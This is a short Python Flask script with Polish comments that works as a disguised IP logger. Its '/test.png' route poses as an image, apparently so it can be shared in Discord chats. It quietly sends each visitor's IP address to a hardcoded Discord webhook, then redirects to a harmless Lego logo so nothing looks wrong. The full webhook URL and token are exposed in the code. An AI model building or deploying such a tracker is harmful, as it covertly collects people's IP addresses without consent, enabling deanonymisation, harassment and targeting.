from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# TWÓJ WEBHOOK (SPRAWDŹ CZY JEST CAŁY!)
WEBHOOK_URL = "https://discord.com/api/webhooks/1336930594799327529/VX0R1leJbv97emxJkz3rKjLKgr5BK6SgoSqcCn_cRc76VepZoxiEpPk3fcTPqgVYlyBi"

@app.route('/test.png') # Zmieniłem na /test.png żeby ominąć cache Discorda
def logger():
    user_agent = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Wysyłamy proste info - bez zbędnych bajerów, żeby nie generować błędów
    try:
        requests.post(WEBHOOK_URL, json={"content": f"🔥 KLIKNIĘTO! IP: `{ip}`"})
    except:
        pass

    # Przekierowanie do pewnego obrazka (Logo Wikipedii)
    return redirect("https://upload.wikimedia.org/wikipedia/commons/d/d4/Lego_logo.png")

if __name__ == '__main__':
    app.run(port=10000)
